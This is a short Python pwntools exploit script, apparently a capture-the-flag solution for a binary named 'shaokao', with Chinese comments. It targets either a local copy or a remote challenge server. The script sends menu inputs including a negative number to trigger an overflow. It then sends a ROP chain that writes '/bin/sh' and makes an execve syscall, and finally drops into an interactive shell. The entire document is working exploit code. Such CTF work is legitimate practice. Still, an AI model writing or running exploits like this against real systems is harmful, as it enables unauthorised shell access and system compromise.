from pwn import *

context(os='linux', arch='amd64', log_level='debug')  # 打印调试信息
content = 1  # 本地Pwn通之后，将content改成0，Pwn远程端口

if content == 1:
    io = process("/home/wyy/桌面/PWN/shaokao")  # 程序路径
else:
    io = remote("39.107.137.13", 20341)  # 题目的远程端口

elf = ELF("/home/wyy/桌面/PWN/shaokao")

name_addr = 0x4E60F0
pop_rdi_addr = 0x40264f
pop_rsi_addr = 0x40a67e
pop_rdx_rbx_addr = 0x4a404b
pop_rax_addr = 0x458827
syscall_addr = 0x402404

io.sendline("1")
io.sendline("1")
io.sendline("-100000000")
io.sendline("4")
io.sendline("5")

payload = b'/bin/sh\x00'.ljust(0x28, b'a')
payload += p64(pop_rax_addr) + p64(0x3b)
payload += p64(pop_rdi_addr) + p64(name_addr)
payload += p64(pop_rsi_addr) + p64(0)
payload += p64(pop_rdx_rbx_addr) + p64(0) + p64(0)
payload += p64(syscall_addr)
io.sendline(payload)

io.interactive()